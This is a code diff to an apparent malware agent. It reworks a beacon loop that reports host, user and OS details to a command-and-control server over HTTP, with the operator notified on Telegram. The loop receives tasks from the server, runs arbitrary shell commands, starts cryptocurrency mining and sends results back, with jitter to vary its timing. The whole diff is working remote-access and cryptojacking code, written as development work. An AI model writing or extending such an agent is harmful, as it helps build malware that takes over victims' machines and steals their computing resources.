@@ -282,120 +282,103 @@ def telegram_report_result(agent_id: str, task_id: int, result: str, success: bo
         log(f"Result report error: {e}", "DEBUG")
 
 def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
-    """Telegram C2 beacon loop - hybrid bridge.
+    """Telegram C2 beacon loop - HTTP primary, Telegram notifications only.
     
-    Architecture:
-    1. Agent sends beacon to Telegram (gets message_id)
-    2. Agent waits for replies from bot
-    3. Bot sees beacon, checks DB, replies with commands
-    4. Agent reads replies and executes
-    5. Agent sends result back
+    Architecture (avoids 429 rate limit):
+    1. Agent sends beacon via HTTP to C2 server
+    2. C2 server updates DB, returns tasks
+    3. Agent executes tasks
+    4. Agent sends results via HTTP
+    5. C2 server (bot) sends Telegram notifications to admin
     
-    For HTTP fallback: if C2_URL is set, also check via HTTP.
+    Only the bot uses Telegram API - agent uses HTTP.
     """
     import random
     
     _total_beacons = 0
     _total_tasks = 0
-    _last_msg_id = 0
-    _consecutive_failures = 0
     
-    # Optional HTTP fallback
-    c2_url = os.environ.get("C2_URL", "")
+    # HTTP C2 URL (required for this mode)
+    c2_url = os.environ.get("C2_URL", "http://127.0.0.1:5000")
     
-    log(f"Telegram bridge started (agent={agent_id[:8]})", "START")
-    log(f"Mode: Telegram bridge + HTTP fallback", "START")
+    log(f"Telegram C2 mode - HTTP beacon to {c2_url}", "START")
+    log(f"Agent: {agent_id[:8]}", "START")
     
     while True:
         try:
             _total_beacons += 1
             
-            # Send beacon to Telegram
+            # Send beacon via HTTP (not Telegram - avoids 429)
             hostname = platform.node()
             platform_type = detect_platform()
             
-            beacon_msg = f"""📡 Beacon #{_total_beacons}
-Agent: {agent_id}
-Host: {hostname}
-Platform: {platform_type}
-Time: {time.strftime('%H:%M:%S')}"""
+            beacon_data = {
+                "id": agent_id,
+                "hostname": hostname,
+                "platform_type": platform_type,
+                "username": os.environ.get("USER", "unknown"),
+                "os": platform.system(),
+                "arch": platform.machine()
+            }
             
-            result = telegram_send(beacon_msg)
-            if result.get("ok"):
-                _last_msg_id = result.get("message_id", 0)
-                _consecutive_failures = 0
-                log(f"Beacon #{_total_beacons} sent (msg_id={_last_msg_id})", "CONN")
-            elif result.get("error") == "rate_limit":
-                # Rate limited - wait and retry
-                wait = result.get("retry_after", 30)
-                log(f"Rate limited, waiting {wait}s before retry", "WARN")
-                time.sleep(wait)
-                continue
-            else:
-                _consecutive_failures += 1
-                log(f"Beacon failed ({_consecutive_failures}): {result.get('error')}", "ERROR")
-                
-                # Exponential backoff on failures
-                if _consecutive_failures > 3:
-                    backoff = min(60, 5 * (2 ** (_consecutive_failures - 3)))
-                    log(f"Backing off {backoff}s", "WARN")
-                    time.sleep(backoff)
-                    continue
-            
-            # Try to read replies (may fail with 409)
-            commands = telegram_read_replies(agent_id, _last_msg_id)
-            
-            # Fallback: HTTP if available
-            if not commands and c2_url:
-                try:
-                    resp = http_post("/api/agent/beacon", {"id": agent_id}, c2_url, None, None)
-                    if resp and "tasks" in resp:
-                        for t in resp.get("tasks", []):
-                            commands.append({
-                                "id": t.get("id"),
-                                "type": t.get("task_type", "exec"),
-                                "command": t.get("payload", "")
-                            })
-                        if commands:
-                            log(f"Got {len(commands)} tasks via HTTP", "TASK")
-                except Exception as e:
-                    log(f"HTTP fallback failed: {e}", "DEBUG")
-            
-            # Process commands
-            for cmd in commands:
-                _total_tasks += 1
-                task_id = cmd.get("id", "unknown")
-                task_type = cmd.get("type", "exec")
-                command = cmd.get("command", "")
-                
-                log(f"Executing #{_total_tasks}: {command}", "TASK")
-                
-                try:
-                    if task_type == "exec":
-                        result = shell_exec(command)
-                    elif task_type == "mine":
-                        result = start_mining(command)
-                    elif task_type == "control" and command == "stop":
-                        telegram_send(f"🛑 Agent {agent_id[:8]} stopping")
-                        return
-                    else:
-                        result = execute_task({"task_type": task_type, "command": command})
+            # HTTP beacon to C2 server
+            try:
+                resp = http_post("/api/agent/beacon", beacon_data, c2_url, None, None)
+                if resp:
+                    log(f"Beacon #{_total_beacons} via HTTP OK", "CONN")
                     
-                    # Send result
-                    telegram_send(f"✅ Task #{task_id}\nResult:\n{result[:500]}")
+                    # Process tasks from response
+                    tasks = resp.get("tasks", [])
+                    for task in tasks:
+                        _total_tasks += 1
+                        task_id = task.get("id", "unknown")
+                        task_type = task.get("task_type", "exec")
+                        command = task.get("payload", "")
+                        
+                        log(f"Task #{task_id}: {command}", "TASK")
+                        
+                        try:
+                            if task_type == "exec":
+                                result = shell_exec(command)
+                            elif task_type == "mine":
+                                result = start_mining(command)
+                            elif task_type == "control" and command == "stop":
+                                return
+                            else:
+                                result = execute_task({"task_type": task_type, "command": command})
+                            
+                            # Report result via HTTP
+                            http_post("/api/agent/result", {
+                                "id": agent_id,
+                                "task_id": task_id,
+                                "result": result[:2000],
+                                "success": True
+                            }, c2_url, None, None)
+                            
+                            log(f"Task #{task_id} completed", "TASK")
+                            
+                        except Exception as e:
+                            http_post("/api/agent/result", {
+                                "id": agent_id,
+                                "task_id": task_id,
+                                "result": str(e),
+                                "success": False
+                            }, c2_url, None, None)
+                else:
+                    log(f"Beacon #{_total_beacons} failed - no response", "ERROR")
                     
-                except Exception as e:
-                    telegram_send(f"❌ Task #{task_id}\nError: {e}")
+            except Exception as e:
+                log(f"HTTP beacon error: {e}", "ERROR")
             
-            # Sleep with jitter (minimum 5s to avoid rate limits)
+            # Sleep with jitter
             jitter_s = sleep * jitter / 100
-            actual_sleep = max(5, sleep + random.uniform(-jitter_s, jitter_s))
+            actual_sleep = max(3, sleep + random.uniform(-jitter_s, jitter_s))
             time.sleep(actual_sleep)
             
         except KeyboardInterrupt:
             break
         except Exception as e:
-            log(f"Bridge error: {e}", "ERROR")
+            log(f"Loop error: {e}", "ERROR")
             time.sleep(10)
 
 def start_mining(config: str) -> str:
